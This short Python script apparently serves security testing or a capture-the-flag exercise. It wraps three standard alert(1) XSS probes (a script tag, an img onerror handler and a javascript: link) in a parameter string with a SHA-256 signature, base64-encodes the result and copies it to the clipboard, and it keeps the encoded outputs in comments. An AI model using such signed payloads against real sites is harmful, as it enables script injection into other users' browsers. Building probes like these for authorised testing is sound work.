from base64 import b64decode, b64encode, encode
from hashlib import sha256
from pyperclip import copy

def create_payload(payload):
    signature = sha256(payload.encode()).hexdigest()
    params = f'name={payload}&signature={signature}'
    # print(f'{params=}', end='\n\n')
    encoded = b64encode(params.encode()).decode()
    return encoded


if __name__ == '__main__':
    payloads = [
        '<script>alert(1)</script>', 
        '<img src=x onerror=alert(1)>', 
        '<a href="javascript:alert(1)>'
        ]
    for payload in payloads:
        encoded = create_payload(payload)
        print(encoded, end='\n\n')
        copy(encoded)
        input()
        # bmFtZT08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+JnNpZ25hdHVyZT01YzE0MGQzNWRjYjQ2YTYyMmUyY2VkZjVlZjVjYzM2MzhjZGZmZDFjMTE4YzkzMzFmOGM4NDY2OWYwYjc0Nzgz

        # bmFtZT08aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+JnNpZ25hdHVyZT02M2I1ODZiNGE5M2YyMDQ4MzdlZTFlMDM4ZjhjZTJiZTg4MGU0MmU1OWJiNDNjYzEyODEzY2YzYWM2ZDA1ZDBj

        # bmFtZT08YSBocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KDEpPiZzaWduYXR1cmU9N2MxZTcxNjE1NTc0NmM4NWEyMjRkYTQ1NTQ4ODQwM2M5ZTAwY2YzYmU1NGZmYTIxZTA1YmZkMWE2ZmQ1ODdjYw==